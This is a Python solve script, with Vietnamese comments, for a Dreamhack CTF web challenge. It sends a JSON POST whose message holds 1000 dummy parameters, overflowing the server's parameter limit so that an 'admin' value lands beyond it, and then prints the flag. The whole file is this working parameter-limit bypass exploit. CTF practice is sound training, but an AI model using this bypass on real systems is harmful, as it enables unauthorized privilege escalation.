import requests
import sys

# Thay đổi URL này thành URL của bài CTF (lấy từ ảnh chụp màn hình của bạn)
URL = "http://host1.dreamhack.games:14026/greet"

def generate_payload(param_count: int) -> str:
    """
    Tạo ra một chuỗi payload với số lượng tham số được chỉ định.
    Ví dụ: p0=1&p1=1&...
    """
    params = []
    for i in range(param_count):
        # f-string giúp tạo chuỗi 'p0=1', 'p1=1', v.v.
        params.append(f"p{i}=1")
    
    # Nối tất cả các phần tử trong list lại với nhau bằng dấu '&'
    return "&".join(params)

def solve():
    """
    Hàm chính để giải bài CTF.
    """

    # Tạo payload chính xác với 1000 tham số để đẩy 'admin' ra vị trí 1001
    param_limit_bypass_payload = generate_payload(1000)
    
    # Dữ liệu POST phải ở dạng JSON, với key là 'msg'
    post_data = {
        "msg": param_limit_bypass_payload
    }

    try:
        # Gửi request POST với body là JSON
        # Thêm timeout để tránh chờ quá lâu
        response = requests.post(URL, json=post_data, timeout=10)

        # Kiểm tra xem request có thành công không (HTTP 200 OK)
        if response.status_code == 200:            
            # Phân tích kết quả JSON từ server
            data = response.json()
            
            # Lấy giá trị từ key 'result'
            flag = data.get('result')

            if flag:
                print(f"flag: {flag}")
            else:
                print("[-] Lỗi: Không tìm thấy key 'result' trong response.")
                print(f"    Nội dung response: {response.text}")

        else:
            print(f"[-] Request thất bại với status code: {response.status_code}")
            print(f"    Nội dung response: {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Đã xảy ra lỗi mạng: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    solve()